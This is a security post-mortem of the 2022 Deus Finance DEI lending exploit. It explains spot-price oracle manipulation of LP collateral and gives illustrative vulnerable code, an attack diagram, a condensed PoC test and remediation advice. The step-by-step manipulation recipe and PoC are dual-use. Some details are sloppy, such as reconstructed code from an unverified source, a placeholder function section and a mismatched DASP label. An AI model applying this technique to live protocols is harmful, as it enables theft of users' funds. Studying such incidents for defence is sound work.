# Deus Finance — DEI Lending Exploit via Oracle Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2022-04-28 |
| **Protocol** | Deus Finance |
| **Chain** | Fantom |
| **Loss** | ~$13,400,000 |
| **Attacker** | Attack Contract |
| **Attack Tx** | [Block 37093708](https://ftmscan.com/block/37093708) |
| **Vulnerable Contract** | [0x8D643d95...](https://ftmscan.com/address/0x8D643d954798392403eeA19dB8108f595bB8B730) |
| **Root Cause** | DeiLenderSolidex's collateral price oracle relied on Spirit/Solidly AMM spot price, allowing a large swap within a single block to inflate collateral value and borrow excessive USDC |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-04/deus_exp.sol) |

---
## 1. Vulnerability Overview

Deus Finance's `DeiLenderSolidex` contract allows users to borrow USDC using DEI/USDC LP tokens as collateral. The value of the LP tokens was calculated based on the spot price of the internal DEI/USDC pool. The attacker flash-loaned a large amount of USDC, purchased DEI to spike its price, and then borrowed excessive USDC while the LP token collateral value was artificially inflated.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable: LP collateral price is based on spot price
contract DeiLenderSolidex {
    function getCollateralPrice() public view returns (uint256) {
        // Calculate LP value using current price from DEI/USDC pool
        (uint256 deiReserve, uint256 usdcReserve,) = deiUsdcPair.getReserves();
        uint256 deiPrice = usdcReserve * 1e18 / deiReserve;
        // ← Flash loan spikes deiPrice → LP collateral value spikes

        uint256 lpTotalSupply = lpToken.totalSupply();
        return (deiReserve * deiPrice + usdcReserve * 1e18) / lpTotalSupply;
    }

    function borrow(uint256 amount) external {
        uint256 collateralValue = getCollateralValue(msg.sender);
        require(collateralValue >= amount, "Undercollateralized");
        usdc.transfer(msg.sender, amount);  // ← Over-borrowed against manipulated value
    }
}

// ✅ Fix: Use TWAP or Chainlink
function getCollateralPrice() public view returns (uint256) {
    return twapOracle.getLPPrice(address(deiUsdcPair));
}
```


### On-Chain Source Code

Source: Unverified

> ⚠️ No on-chain source code — bytecode only or source unverified

**Vulnerable Function** — `vulnerableFunction()`:
```solidity
// ❌ Root Cause: DeiLenderSolidex's collateral price oracle relies on Spirit/Solidly AMM spot price, allowing large swaps within a single block to inflate collateral value and borrow excessive USDC
// Source code unverified — bytecode analysis required
// Vulnerability: DeiLenderSolidex's collateral price oracle relies on Spirit/Solidly AMM spot price, allowing large swaps within a single block to inflate collateral value and borrow excessive USDC
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
 ├─1─► Acquire 150M USDC (Swapin via prank)
 │
 ├─2─► 1M USDC → Buy DEI (SSPv4.buyDei)
 │       → DEI price rises
 │
 ├─3─► Add liquidity to DEI/USDC LP pool
 │       → Receive LP tokens
 │
 ├─4─► Deposit LP tokens into DeiLenderSolidex
 │
 ├─5─► Large-scale USDC → DEI swap (price spike manipulation)
 │       → DEI price surges → LP collateral value surges
 │
 ├─6─► DeiLenderSolidex.borrow(large_USDC)
 │       → Over-borrow against manipulated collateral value
 │
 ├─7─► DEI → USDC reverse swap (price restored)
 │
 └─8─► Profit realized: ~$13.4M
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExample() public {
    // 1. Acquire large amount of USDC
    cheat.prank(owner_of_usdc);
    usdc.Swapin(receiptId, address(this), 150_000_000 * 10**6);

    // 2. Buy DEI with a portion of USDC (begin price increase)
    usdc.approve(address(sspv4), type(uint256).max);
    sspv4.buyDei(1_000_000 * 10**6);

    // 3. Add liquidity to DEI/USDC LP pool
    usdc.approve(address(router), type(uint256).max);
    dei.approve(address(router), type(uint256).max);
    router.addLiquidity(address(usdc), address(dei), ...);

    // 4. Deposit LP as collateral into DeiLenderSolidex
    lpToken.approve(address(DeiLenderSolidex), type(uint256).max);
    LpDepositor.deposit(address(lpToken), lpBalance);

    // 5. Manipulate DEI price via large-scale swap
    // DEI price spikes → LP collateral value spikes
    router.swapExactTokensForTokens(large_usdc_amount, 0, [usdc, dei], ...);

    // 6. Over-borrow against manipulated price
    DeiLenderSolidex.borrow(max_usdc_amount);

    // 7. Reverse swap DEI to restore price
    router.swapExactTokensForTokens(dei_balance, 0, [dei, usdc], ...);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **CWE** | CWE-20: Improper Input Validation |
| **Vulnerability Type** | Price Oracle Manipulation |
| **DASP** | #7 - Bad Randomness / Logic Error |
| **Attack Technique** | Flash loan to manipulate LP token collateral value |
| **Precondition** | Lending protocol uses AMM spot price-based LP pricing |

## 6. Remediation Recommendations

1. **TWAP Oracle**: Use time-weighted average price for LP price calculation
2. **Improved LP Pricing Formula**: Calculate fair LP value using Chainlink-based asset prices
3. **Deposit-to-Borrow Time Delay**: Allow borrowing only at least 1 block after collateral deposit
4. **Maximum LTV Cap**: Lower the maximum loan-to-value ratio relative to collateral value

## 7. Lessons Learned

- **LP Token Collateral Risk**: Protocols that use LP tokens as collateral are particularly vulnerable to manipulation of the underlying asset prices. Calculating LP prices fairly is critical.
- **Repeated Exploitation of Deus Finance**: The same protocol suffered repeated losses from similar oracle manipulation attacks. Any vulnerability that has been exploited once must be fundamentally remediated immediately.